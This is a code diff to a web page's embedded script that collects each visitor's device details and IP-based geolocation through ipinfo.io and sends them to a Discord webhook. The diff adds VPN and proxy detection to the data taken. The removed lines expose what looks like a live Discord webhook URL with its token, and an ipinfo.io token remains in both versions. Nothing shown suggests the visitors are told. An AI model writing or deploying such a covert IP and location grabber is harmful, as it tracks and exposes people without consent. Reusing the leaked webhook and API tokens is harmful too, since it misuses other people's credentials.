@@ -103,9 +103,8 @@
 
     <script>
 
-    // Function to send device and geolocation information to Discord webhook
     function sendDeviceInfoToWebhook() {
-        const webhookURL = 'https://discord.com/api/webhooks/1296274274151043072/ImR7zXQ3rInBB3LXRwj_-n-PZgnBv-UupH44qtpY1p6LkwuGnOjSwzvFWWZtMyG0zp42';
+        const webhookURL = 'https://discord.com/api/webhooks/your-webhook-url';
 
         // Device information
         const deviceInfo = {
@@ -116,8 +115,8 @@
             language: navigator.language
         };
 
-        // Fetch geolocation info from ipinfo.io
-        fetch('https://ipinfo.io?token=0a7775d6f7e150') // Replace with your ipinfo.io token
+        // Fetch geolocation info and detect VPN/proxy
+        fetch('https://ipinfo.io?token=0a7775d6f7e150')  // Use your ipinfo.io token
             .then(response => response.json())
             .then(data => {
                 const geoInfo = {
@@ -125,7 +124,9 @@
                     country: data.country,
                     region: data.region,
                     city: data.city,
-                    org: data.org
+                    org: data.org,
+                    vpnStatus: data.security?.vpn ? "Yes (VPN detected)" : "No (No VPN)",
+                    proxyStatus: data.security?.proxy ? "Yes (Proxy detected)" : "No (No Proxy)"
                 };
 
                 // Construct the message content for Discord
@@ -143,6 +144,8 @@
                     - **Region:** ${geoInfo.region}
                     - **City:** ${geoInfo.city}
                     - **Organization:** ${geoInfo.org}
+                    - **VPN Status:** ${geoInfo.vpnStatus}
+                    - **Proxy Status:** ${geoInfo.proxyStatus}
                 `;
 
                 // Send the information to the Discord webhook
@@ -152,7 +155,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: content, // Discord expects "content" for plain text messages
+                        content: content,
                     })
                 })
                 .then(response => {
